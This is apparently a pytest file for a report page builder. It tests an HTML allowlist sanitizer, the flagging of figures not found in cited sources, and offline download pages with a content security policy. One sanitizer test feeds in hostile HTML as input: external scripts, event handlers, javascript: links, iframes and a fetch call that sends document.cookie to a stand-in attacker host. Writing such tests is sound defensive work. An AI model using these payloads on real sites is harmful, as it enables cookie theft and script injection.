"""The report page's building blocks (reports PR, ADR-0380 to ADR-0383): the allowlist sanitizer, the
figure check and the page's frame, sources section and served forms. Pure functions: no service."""

import json
import re
from html.parser import HTMLParser

import pytest

from app.artifacts.config import load_artifacts
from app.artifacts.document import (
    KIT_MARKER,
    Renderer,
    editable,
    normalize_data,
    served,
    sources_section,
)
from app.artifacts.figures import canonical, canonical_number, figures, spans
from app.artifacts.html import Sanitizer, clean_css
from app.settings import _default_config_dir

CONFIG = _default_config_dir()  # <repo>/config in a checkout, the /srv/config mount in the test container
ARTIFACTS = load_artifacts(CONFIG)


def build(source: str, locale: str = "ar", allowed: set[str] | None = None, chunk: int = 11):
    """The page as the stream renders it, fed in small chunks as a model streams it."""
    sanitizer = Sanitizer()
    renderer = Renderer(locale, allowed or set(), "غير موثق" if locale == "ar" else "Unverified")
    out = ""
    for start in range(0, len(source), chunk):
        sanitizer.feed_model(source[start : start + chunk])
        out += renderer.render(sanitizer.drain())
    out += renderer.render(sanitizer.finish())
    return out + renderer.end(sources_section([], locale, ARTIFACTS.report.text, unverified=True)), renderer


EXTERNAL = re.compile(r"(?i)(https?:)?//[a-z0-9.-]+\.[a-z]{2,}|javascript:|@import|\bon[a-z]+\s*=")


# ------------------------------------------------------------------ sanitizer


def test_scripts_frames_handlers_and_external_urls_never_survive():
    page, _ = build(
        '<!doctype html><html><head><link rel="stylesheet" href="https://cdn.example.com/x.css">'
        '<base href="https://evil.example.com/"><script src="https://evil.example.com/x.js"></script>'
        "<style>@import url(https://e.example.com/a.css); .h{background:url(https://e.example.com/p.png)}"
        " .g{fill:url(#grad)}</style></head>"
        '<body onload="steal()"><a href="https://evil.example.com">رابط</a><a href="javascript:alert(1)">x</a>'
        '<a href="#section-2">داخلي</a><img src="https://e.example.com/i.png" onerror="x()">'
        '<iframe src="https://e.example.com">مخفي<b>لا</b></iframe><object data="x">لا</object>'
        '<svg viewBox="0 0 10 10"><use href="https://e.example.com/s.svg#a"/><image href="https://e.example.com/i"/>'
        '<rect fill="url(https://e.example.com/x)" width="5"/></svg>'
        "<script>fetch('https://e.example.com/'+document.cookie)</script>"
        '<form action="https://e.example.com"><input name="q"></form></body></html>'
    )
    assert not EXTERNAL.search(page), EXTERNAL.search(page)
    assert "<script" not in page.replace('<script type="application/json" id="report-data">', "")
    assert "مخفي" not in page and "steal" not in page
    assert 'href="#section-2"' in page and "url(#grad)" in page


def test_the_platform_writes_the_frame_lang_and_dir_from_the_locale():
    page, _ = build('<html lang="en" dir="ltr"><head><title>لوحة</title></head><body><p>نص</p></body></html>', "ar")
    assert page.startswith(
        '<!doctype html><html lang="ar" dir="rtl"><head><meta charset="utf-8">'
        f'<meta name="viewport" content="width=device-width, initial-scale=1">{KIT_MARKER}<title>'
    )
    english, _ = build("<html><body><p>text</p></body></html>", "en")
    assert english.startswith('<!doctype html><html lang="en" dir="ltr">')
    assert page.count("<body>") == 1 and page.endswith("</body></html>")


def test_text_before_and_after_the_document_is_not_the_page():
    page, _ = build("Here is your dashboard:\n```html\n<!doctype html><html><body><p>نص</p></body></html>\n```\nDone!")
    assert "Here is" not in page and "```" not in page and "Done!" not in page
    assert "<p>نص</p>" in page


def test_the_platforms_marks_cannot_be_forged_by_the_model():
    page, _ = build(
        '<html><body><span class="kit-unverified" data-kit="unverified">١٠</span>'
        '<section class="kit-sources kit-card" data-kit="sources"><h2>المصادر</h2></section></body></html>',
        allowed={"10"},
    )
    assert 'class="kit-card"' in page and 'data-kit="sources" lang' in page  # only the platform's own section
    assert page.count("kit-unverified") == 0


def test_css_loses_every_url_but_in_document_references():
    css = clean_css(".a{background:url('https://x.example.com/a.png')} .b{fill:url(#g)} @import 'x.css'; .c{x:expression(1)}")
    assert "x.example.com" not in css and "url(#g)" in css and "@import" not in css and "expression" not in css


def test_the_report_data_block_keeps_charts_only_and_cannot_close_its_script():
    page, _ = build(
        '<html><body><div class="kit-chart" data-chart="g"></div><script type="application/json" id="report-data">'
        '{"charts":{"g":{"type":"line","labels":["2030","2031"],"datasets":[{"label":"النمو <b>","data":[3.1,"x",3.6]}]}},'
        '"script":"alert(1)"}</script><script type="application/json" id="report-data">{"charts":{}}</script></body></html>',
        allowed={"2030", "2031", "3.1", "3.6"},
    )
    block = re.search(r'<script type="application/json" id="report-data">(.*?)</script>', page).group(1)
    data = json.loads(block)
    assert set(data) == {"charts"} and data["charts"]["g"]["datasets"][0]["data"] == [3.1, None, 3.6]
    assert "<" not in block and page.count('id="report-data"') == 1


def test_invalid_report_data_is_an_empty_block():
    assert normalize_data("{not json") == {"charts": {}}
    assert normalize_data('{"charts":{"a":{"type":"weird","labels":[1],"datasets":[{"data":[1e30, true]}]}}}') == {
        "charts": {"a": {"type": "bar", "title": "", "labels": ["1"], "datasets": [{"label": "", "data": [None, None]}]}}
    }


# ------------------------------------------------------------------ figures (D2, I3)


@pytest.mark.parametrize(
    ("raw", "expected"),
    [("1,250", "1250"), ("١٬٢٥٠", "1250"), ("3.60", "3.6"), ("٣٫٦", "3.6"), ("007", "7"), ("2031", "2031"), ("0.50", "0.5")],
)
def test_canonical_figures(raw, expected):
    assert canonical(raw) == expected


def test_names_with_digits_are_not_figures():
    found = [c for _, _, c in spans("Q1 و H2 و COVID-19 و 5G و 3D، ثم 18% و 2031م")]
    assert found == ["18", "2031"]


def test_number_words_and_dates_in_the_sources_count():
    allowed = figures(["يستحق العامل إجازة مدتها واحد وعشرون يوما", "نُشر في 2031-07-20"])
    assert {"21", "2031", "7", "20"} <= allowed
    assert canonical_number(3.0) == "3" and canonical_number(2.40) == "2.4"


def test_unmatched_figures_are_marked_and_matched_ones_are_not():
    page, renderer = build(
        '<html><body><div class="kit-kpi-value">3.6<span class="kit-kpi-unit">%</span></div>'
        "<p>بلغ النمو ٣٫٦ وكان 3.1 قبل عام، والصادرات 1,250 مليون.</p>"
        '<svg viewBox="0 0 9 9"><text x="1">42</text></svg></body></html>',
        allowed={"3.6", "1250"},
    )
    assert renderer.count.total == 5 and renderer.count.unverified == 2
    assert '<span class="kit-unverified" data-kit="unverified">3.1</span>' in page
    assert '42<tspan class="kit-unverified-svg"> (غير موثق)</tspan>' in page
    assert ">3.6<" in page and "1,250" in page and renderer.count.verified_figures == {"3.6", "1250"}


def test_a_figure_split_between_stream_chunks_is_checked_whole():
    page, renderer = build("<html><body><p>القيمة 1,234,567 ريال</p></body></html>", allowed=set(), chunk=3)
    assert '<span class="kit-unverified" data-kit="unverified">1,234,567</span>' in page
    assert renderer.count.unverified_figures == ["1234567"]


def test_chart_points_and_labels_are_flagged_by_the_same_rule():
    _, renderer = build(
        '<html><body><script type="application/json" id="report-data">{"charts":{"g":{"type":"bar",'
        '"labels":["2030","2031"],"datasets":[{"label":"x","data":[3.1,3.6]}]}}}</script></body></html>',
        allowed={"2031", "3.6"},
    )
    assert renderer.count.unverified_figures == ["2030", "3.1"]


# ------------------------------------------------------------------ the sources section and the served forms


def test_the_sources_section_names_kb_title_publisher_date_and_pages_in_western_digits():
    citation = {"id": "d1", "title": "آفاق اقتصاد الواحة - يوليو 2031", "kb_name": {"ar": "اقتصاد الواحة", "en": "Oasis economy"},
                "publisher": "صندوق الواحة للنقد", "published_on": "2031-07-20", "pages": [2, 3]}
    section = sources_section([citation], "ar", ARTIFACTS.report.text, unverified=True)
    assert "<h2>المصادر</h2>" in section
    assert "اقتصاد الواحة › آفاق اقتصاد الواحة - يوليو 2031 — صندوق الواحة للنقد — 2031-07-20 — ص 2, 3" in section
    assert "غير موثق" in section
    english = sources_section([], "en", ARTIFACTS.report.text, unverified=True)
    assert "<h2>Sources</h2>" in english and 'dir="ltr"' in english


def test_the_view_links_the_kit_from_its_path_and_the_download_inlines_it():
    page, _ = build("<html><body><p>x</p></body></html>")
    view = served(page, ARTIFACTS.kit, form="view", kit_base="http://localhost:8080/report-kit/v1/")
    assert '<link rel="stylesheet" href="http://localhost:8080/report-kit/v1/kit.css">' in view
    assert '<script src="http://localhost:8080/report-kit/v1/kit.js" defer></script>' in view
    download = served(page, ARTIFACTS.kit, form="download")
    # Opened offline from a file: nothing to fetch, and a policy of its own that runs the kit's scripts only.
    assert not re.search(r"""(?:src|href)\s*=\s*["']?(?:https?:)?//""", download)
    assert not re.search(r"url\(\s*['\"]?(?:https?:)?//", download)
    assert "data:font/woff2;base64," in download and KIT_MARKER not in download
    csp = re.search(r'<meta http-equiv="Content-Security-Policy" content="([^"]+)">', download).group(1)
    assert "connect-src 'none'" in csp and "'unsafe-inline'" not in csp.split("script-src", 1)[1].split(";")[0]
    assert len(re.findall(r"'sha256-", csp)) == len(ARTIFACTS.kit.scripts)


def test_an_inlined_kit_script_cannot_close_its_element():
    for _, source in ARTIFACTS.kit.scripts:
        assert "</script" not in source.lower()


def test_the_stored_page_parses_and_editable_strips_the_platforms_marks():
    page, _ = build("<html><body><p>القيمة 5</p></body></html>", allowed=set())
    HTMLParser().feed(page)  # the stdlib parser accepts it
    clean = editable(page)
    assert "kit-unverified" not in clean and "kit-sources" not in clean and "القيمة 5" in clean
